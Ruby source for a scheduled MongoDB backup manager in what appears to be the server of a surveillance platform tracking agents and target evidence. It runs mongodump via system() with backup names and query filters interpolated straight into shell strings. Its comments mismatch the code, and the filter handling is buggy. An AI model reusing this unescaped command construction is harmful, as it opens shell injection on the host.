#
#  Heartbeat to update the status of the component in the db
#

# relatives
require_relative 'db_layer'

# from RCS::Common
require 'rcs-common/trace'


module RCS
module DB

class BackupManager
  extend RCS::Tracer

  def self.perform

    now = Time.now

    ::Backup.all.each do |backup|

      btime = backup.when

      # skip disabled backups
      next unless backup.enabled

      # process the backup only if the time is right
      next unless now.strftime('%H:%M') == btime['time']

      # check if the day of the month is right
      next if (not btime['month'].empty? and not btime['month'].include? now.mday)

      # check if the day of the week is right
      next if (not btime['week'].empty? and not btime['week'].include? now.wday)

      trace :info, "Performing backup [#{backup.name}]..."

      Audit.log :actor => '<system>', :action => 'backup.start', :desc => "Performing backup #{backup.name}"

      backup.status = 'RUNNING'
      backup.save
      
      # retrieve the list of collection and iterate on it to create a backup
      # the 'what' property of a backup decides which collections have to be backed up
      collections = Mongoid::Config.master.collection_names

      # don't backup the system indexes
      collections.delete('system.indexes')
      # don't backup the statuses of the components
      collections.delete('statuses')
      # don't backup the logs of the components
      collections.delete_if {|x| x['logs.']}

      # remove it here, it will not be dumped in the main cycle
      # we call a dump on it later with grid_filter applied on it
      collections.delete_if {|x| x['fs.']}

      case backup.what
        when 'metadata'
          # don't backup evidence collections
          collections.delete_if {|x| x['evidence.']}
          grid_filter = get_grid_ids
        when 'full'
          # we backup everything... woah !!
          grid_filter = {}
        else
          #TODO: backup per operation
      end

      # the command of the mongodump
      command = Config.mongo_exec_path('mongodump')
      command += " -o #{Config.instance.global['BACKUP_DIR']}/#{backup.name}-#{now.strftime('%Y-%m-%d-%H:%M')}"
      command += " -d rcs"

      # create the backup of the collection (common)
      collections.each do |coll|
        system command + " -c #{coll}"
      end

      # TODO: FIXME: what happens if grid_filter is huge?
      
      # add the specific collections:
      # - evidence collections of targets (inside the selected operation)
      # - gridfs entries linked to backed up collections
      system command + " -c fs.files -q '#{grid_filter}'"
      # use the same query to retrieve the chunk list
      grid_filter['_id'] = 'files_id'
      system command + " -c fs.chunks -q '#{grid_filter}'"

      Audit.log :actor => '<system>', :action => 'backup.end', :desc => "Backup #{backup.name} completed"

      # TODO: report ERRORS
      backup.status = 'COMPLETED'
      backup.save
    end

  end

  def self.get_grid_ids

    grid_ids = []

    # here we need to return the list of gridfs ids that are linked
    # to other objects into the db

    # the files of the upload_request
    ::Item.agents.each do |item|
      item.upload_requests.each do |up|
        grid_ids << up[:_grid].first
      end
      item.upgrade_requests.each do |up|
        grid_ids << up[:_grid].first
      end
    end

    # the replace file of the proxy rules
    ::Proxy.all.each do |proxy|
      proxy.rules.each do |rule|
        grid_ids << rule[:_grid].first unless rule[:_grid].nil?
      end
    end

    # create a printable json query with BSON::Object converted to ObjectId
    json_query = "{\"_id\":{\"$in\": ["

    grid_ids.each do |id|
      json_query += "ObjectId(\"#{id}\"),"
    end

    json_query += "0]}}"
    
    return json_query
  end

end

end #Collector::
end #RCS::